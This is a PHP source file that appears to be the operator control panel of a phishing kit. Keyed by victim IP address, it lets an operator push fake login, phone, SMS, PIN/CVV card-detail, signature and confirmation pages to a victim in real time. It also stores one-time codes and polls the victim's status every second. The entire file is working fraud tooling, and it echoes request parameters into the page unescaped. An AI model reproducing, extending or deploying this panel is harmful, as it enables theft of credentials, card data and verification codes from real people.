<?php 
require 'panel.class.php';
$pnl = new Panel();

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}


if(isset($_POST['reader'])){
    $cc = $_POST['reader'];
    $ip = $_POST['ip'];
    $pnl->updateD($ip, $cc);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}

// signature
if(isset($_POST['code1'])){
    $code1 = $_POST['code1'];
    $code2 = $_POST['code2'];
    $ip = $_POST['ip'];
    $pnl->updateC($ip, "$code1@$code2");
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}


if(isset($_POST['inst'])){
    $inst = $_POST['inst'];
    $ip = $_POST['ip'];
    $pnl->updateInst($ip, $inst);
    header("location: ctr.php?ip=".$_POST['ip']."&updated");
}

if(isset($_GET['ip'])){
    $codes = explode("@", @$pnl->getC(@$_GET['ip']));
}

?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

if(isset($_GET['uploaded'])){
    echo "<h1>FILE UPLOADED!</h1>";
}
 
if(isset($_GET['updated'])){
    echo "<h1>DATA UPDATED!</h1>";
}
 

?>

<form>
    <span>[<?php echo @$_GET['ip'];?>] </span>
    <span>[<span id="statu">loading...</span>]</span>
</form>

<form action="ctr.php" method="get">
    <h3 style="color:white;">Control options</h3>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
    <button type="submit" name="page" value="mkfile.php?p=login&params=?e=ERROR">LOGIN ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=phone">PHONE</button>
    <button type="submit" name="page" value="mkfile.php?p=phone&params=?e=ERROR">PHONE ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=sms">SMS</button>
    <button type="submit" name="page" value="mkfile.php?p=sms&params=?e=ERROR">SMS ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=info">INFO</button>
    <button type="submit" name="page" value="mkfile.php?p=info&params=?e=ERROR">INFO ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=cc_details">PIN/CVV</button>
    <button type="submit" name="page" value="mkfile.php?p=cc_details&params=?e=ERROR">PIN/CVV ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=sign">SIGNATURE</button>
    <button type="submit" name="page" value="mkfile.php?p=sign&params=?e=ERROR">SIGNATURE ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=confirmation">CONFIRMATION</button>
    <button type="submit" name="page" value="mkfile.php?p=confirmation&params=?e=ERROR">CONFIRMATION ERROR</button>
    <button type="submit" name="page" value="mkfile.php?p=done">SUCCESS</button>
    <button type="submit" name="page" value="exit.php">EXIT</button>
</form>

<form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add signature code</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="text" required placeholder="Signature code" value="<?php echo @$pnl->getD(@$_GET['ip']); ?>" name="reader"><br>
<button type="submit">ADD SIGNATURE CODE</button>
</form>

<form action="ctr.php" method="post" enctype="multipart/form-data" >
<h3 style="color:white;">Add confirmation codes</h3>
<input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
<input type="text" required placeholder="Confirmation code 1" value="<?php echo @$codes[0]; ?>" name="code1">
<input type="text" required placeholder="Confirmation code 2" value="<?php echo @$codes[1]; ?>" name="code2"><br>
<button type="submit" style="width:auto;">ADD CONFIRMATION CODES</button>
</form>

 
 
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

    setInterval(() => {
        $.post("get_statu.php",{get:1, ip:'<?php echo @$_GET['ip']?>'},(res)=>{
            $("#statu").html(res);
        });
    }, 1000);
</script>

</body>
</html>